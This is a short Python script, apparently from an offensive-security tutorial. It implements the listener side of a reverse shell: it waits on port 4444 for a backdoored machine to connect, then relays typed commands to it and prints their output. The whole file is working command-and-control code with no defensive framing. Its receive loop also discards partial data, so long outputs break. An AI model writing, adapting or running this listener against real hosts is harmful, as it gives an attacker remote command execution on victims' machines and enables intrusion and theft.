import socket 
import json



class Listener:
    
    def __init__(self,ip,port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
        listener.bind((ip,port))
        listener.listen(0)
        self.message('[+] Wait for connection')
        self.connection, self.address = listener.accept()
        self.message(f'[+] connected to {self.address}')
    
    def send_data(self,data):
        json_data = json.dumps(data)
        self.connection.send(bytes(json_data,'utf8'))
    
    def recv_data(self):
        json_data = ""
        while True:
            try:
                json_data = self.connection.recv(1024).decode('utf8','ignore')
                return json.loads(json_data)
            except ValueError:
                continue
    
    def run_remote(self,command):
        self.send_data(command)
        return self.recv_data()
    
    def message(self,msg):
        print(msg)
    
    def run(self):
        while True:
            command = input('>>')
            resut_command = self.run_remote(command)
            print(resut_command)
    
    
    
    
    
hear = Listener("192.168.43.52",4444)
hear.run()